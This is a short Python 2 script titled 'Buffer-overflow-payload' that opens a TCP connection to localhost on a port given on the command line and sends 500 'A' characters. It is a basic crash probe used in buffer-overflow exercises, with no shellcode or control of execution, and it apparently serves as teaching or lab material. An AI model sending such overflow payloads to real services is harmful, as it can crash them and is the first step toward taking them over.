# Buffer-overflow-payload

 #!/usr/bin/python
import socket
import sys


host = "127.0.0.1"
port = int(sys.argv[1])

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect((host , port))

buffer = "A" * 500

print "Sending Payload!"

sock.send(buffer)

print "Payload sent: " + buffer

sock.close()
